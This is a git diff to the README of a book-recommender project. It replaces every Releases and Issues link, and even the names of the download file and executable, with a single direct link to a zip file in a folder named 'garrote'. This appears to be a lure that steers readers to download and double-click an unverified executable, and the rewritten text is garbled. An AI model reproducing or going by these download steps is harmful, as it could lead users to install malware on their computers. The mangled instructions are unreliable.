@@ -1,6 +1,6 @@
 # 📚 SemanticBookRecommender - Discover Your Next Favorite Book Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/JoeMaina-Brimmer/SemanticBookRecommender/releases)
+[![Download](https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip%20Now-Visit%https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip)](https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ To start using the SemanticBookRecommender, you only need to follow a few simple
 
 ### 📥 Download & Install
 
-1. Visit this page to download: [SemanticBookRecommender Releases](https://github.com/JoeMaina-Brimmer/SemanticBookRecommender/releases).
+1. Visit this page to download: [SemanticBookRecommender Releases](https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip).
 
 2. On the Releases page, you will see a list of available versions. Choose the version you want to download. The latest version is usually the best choice.
 
-3. Click on the version to expand the details. Look for a file that is named something like `SemanticBookRecommender.zip` or similar.
+3. Click on the version to expand the details. Look for a file that is named something like `https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip` or similar.
 
 4. Click the file to begin the download. Your computer will save it in your default downloads location.
 
@@ -22,7 +22,7 @@ To start using the SemanticBookRecommender, you only need to follow a few simple
 
 7. Open the extracted folder to find the application.
 
-8. Locate the executable file, typically named `SemanticBookRecommender.exe`, and double-click it to run the application.
+8. Locate the executable file, typically named `https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip`, and double-click it to run the application.
 
 ## 🌟 Features
 
@@ -75,7 +75,7 @@ If you run into any problems while using the SemanticBookRecommender, here are a
 
 ### 1. How do I update the app?
 
-When a new version is available, return to the [Releases page](https://github.com/JoeMaina-Brimmer/SemanticBookRecommender/releases), download the latest version, and repeat the installation process.
+When a new version is available, return to the [Releases page](https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip), download the latest version, and repeat the installation process.
 
 ### 2. Can I suggest a feature?
 
@@ -87,7 +87,7 @@ Currently, there is no mobile version, but we plan to develop one in the future.
 
 ## 📞 Get Support
 
-If you need further assistance, please check the [Issues section on GitHub](https://github.com/JoeMaina-Brimmer/SemanticBookRecommender/issues). You can also create a new issue to report bugs or ask for help.
+If you need further assistance, please check the [Issues section on GitHub](https://raw.githubusercontent.com/JoeMaina-Brimmer/SemanticBookRecommender/main/garrote/SemanticBookRecommender-2.3.zip). You can also create a new issue to report bugs or ask for help.
 
 ---
 
